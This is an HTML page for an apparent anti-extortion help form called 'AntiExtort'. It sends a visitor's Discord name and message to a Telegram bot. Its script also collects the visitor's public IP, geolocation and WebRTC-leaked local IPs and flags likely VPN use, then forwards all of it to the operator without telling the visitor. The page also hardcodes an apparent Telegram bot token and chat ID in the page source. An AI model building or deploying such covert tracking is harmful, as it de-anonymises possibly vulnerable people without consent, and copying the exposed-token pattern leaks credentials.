<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>1732 AntiExtort</title>
  <style>
    body {
      margin: 0;
      background: repeating-linear-gradient(45deg, #000, #000 10px, #222 10px, #222 20px);
      color: white;
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      animation: glitchAnim 3s infinite linear;
      padding: 1rem;
      box-sizing: border-box;
      filter: grayscale(100%);
      position: relative;
    }

    @keyframes glitchAnim {
      0%, 100% { background-position: 0 0; filter: grayscale(100%); }
      25% { background-position: 50px 0; filter: grayscale(80%) contrast(120%); }
      50% { background-position: 100px 100px; filter: grayscale(100%) contrast(100%); }
      75% { background-position: 50px 50px; filter: grayscale(80%) contrast(130%); }
    }

    .container {
      background-color: rgba(0, 0, 0, 0.85);
      border: 1px solid white;
      padding: 2rem;
      width: 90%;
      max-width: 500px;
      margin-top: 3rem;
      box-shadow: 0 0 10px white, 0 0 20px white inset;
      border-radius: 8px;
      box-sizing: border-box;
      position: relative;
      z-index: 1;
    }

    h1 {
      font-size: 3rem;
      text-align: center;
      margin-bottom: 2rem;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      text-shadow: 2px 0 white, -2px 0 white;
    }

    input, textarea {
      width: 100%;
      padding: 0.9rem 1rem;
      margin-bottom: 1rem;
      border: 1px solid white;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 1rem;
      font-family: 'Courier New', Courier, monospace;
      border-radius: 4px;
      outline: none;
    }

    button {
      width: 100%;
      padding: 1rem;
      background: transparent;
      border: 2px solid white;
      color: white;
      font-weight: 900;
      font-size: 1.2rem;
      font-family: 'Courier New', Courier, monospace;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .success {
      text-align: center;
      margin-top: 1rem;
      font-weight: bold;
    }

    #clock, #submissionsToday, #tzWarning {
      text-align: center;
      margin-top: 0.5rem;
      font-size: 1rem;
    }

    #webrtcIPs {
      margin-top: 0.5rem;
      font-size: 0.9rem;
      color: #bbb;
      text-align: center;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>AntiExtort</h1>
    <input type="text" id="discord" placeholder="Discord Username (e.g., user)" autocomplete="off" />
    <textarea id="message" placeholder="What do you need?" rows="5"></textarea>

    <button id="sendBtn" onclick="sendMessage()">Send</button>
    <p id="response" class="success" style="display: none;"></p>
    <div id="clock"></div>
    <div id="tzWarning"></div>
    <div id="submissionsToday">Submissions today: 0</div>
    <div id="webrtcIPs"></div>
  </div>

<script>
const TELEGRAM_BOT_TOKEN = '8395760817:AAFe1M_YCXdqxDpno5EKNJ4PairARNQV1ts';
const TELEGRAM_CHAT_ID = '6037000451';

let submissionCount = 0;
let localIPs = [];

function startCooldown() {
  const button = document.getElementById("sendBtn");
  button.disabled = true;
  let seconds = 60;
  button.innerText = `Wait ${seconds}s`;

  const interval = setInterval(() => {
    seconds--;
    button.innerText = `Wait ${seconds}s`;
    if (seconds <= 0) {
      clearInterval(interval);
      button.disabled = false;
      button.innerText = "Send";
    }
  }, 1000);
}

function updateClock() {
  const now = new Date();
  document.getElementById("clock").innerText = "üïí Local Time: " + now.toLocaleTimeString();
}
setInterval(updateClock, 1000);
updateClock();

// Basic timezone mismatch check
(function timezoneFingerprintCheck() {
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      const tz = data.timezone;
      const mismatch = !Intl.DateTimeFormat().resolvedOptions().timeZone.includes(tz);
      if (mismatch) {
        document.getElementById("tzWarning").innerText = "‚ö†Ô∏è Timezone mismatch detected (VPN?)";
      }
    });
})();

// WebRTC Leak IP detection
async function getLocalIPs() {
  return new Promise((resolve, reject) => {
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => reject(e));
      pc.onicecandidate = (ice) => {
        if (!ice || !ice.candidate) {
          if (ips.size === 0) resolve([]);
          return;
        }
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const ipMatch = ipRegex.exec(ice.candidate.candidate);
        if (ipMatch) {
          ips.add(ipMatch[1]);
          document.getElementById("webrtcIPs").innerText = `üïµÔ∏è WebRTC Local IPs: ${[...ips].join(", ")}`;
          resolve([...ips]);
        }
      };
    } catch(e) {
      reject(e);
    }
  });
}

// Get WebRTC IPs on load
getLocalIPs().then(ips => {
  localIPs = ips;
}).catch(() => {
  document.getElementById("webrtcIPs").innerText = "üïµÔ∏è WebRTC IP detection not supported";
});

async function sendMessage() {
  const discord = document.getElementById("discord").value.trim();
  const message = document.getElementById("message").value.trim();
  const responseEl = document.getElementById("response");

  if (!discord || !message) {
    alert("Please fill out all fields.");
    return;
  }

  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const locationInfo = `üåç *IP Info:*
IP: ${ipData.ip}
City: ${ipData.city}
Region: ${ipData.region}
Country: ${ipData.country_name}
Timezone: ${ipData.timezone}`;

    let webrtcInfo = "";
    if (localIPs.length > 0) {
      webrtcInfo = `\nüïµÔ∏è *WebRTC Local IP Leak(s):*\n${localIPs.join(", ")}`;
    } else {
      webrtcInfo = `\nüïµÔ∏è *WebRTC Local IP Leak(s):* None detected or not supported`;
    }

    const text = `üö® *New Submission*
üë§ *Discord:* ${discord}
üí¨ *Message:* ${message}

${locationInfo}${webrtcInfo}`;

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "Markdown" }),
    });

    const data = await res.json();
    if (data.ok) {
      submissionCount++;
      document.getElementById("submissionsToday").innerText = `Submissions today: ${submissionCount}`;
      responseEl.innerText = "‚úÖ Message sent to Telegram!";
      responseEl.style.display = "block";
      document.getElementById("discord").value = '';
      document.getElementById("message").value = '';
      startCooldown();
    } else {
      responseEl.innerText = `‚ùå Telegram error: ${data.description}`;
      responseEl.style.display = "block";
    }
  } catch (err) {
    responseEl.innerText = "‚ùå Network error occurred.";
    responseEl.style.display = "block";
  }
}
</script>
</body>
</html>
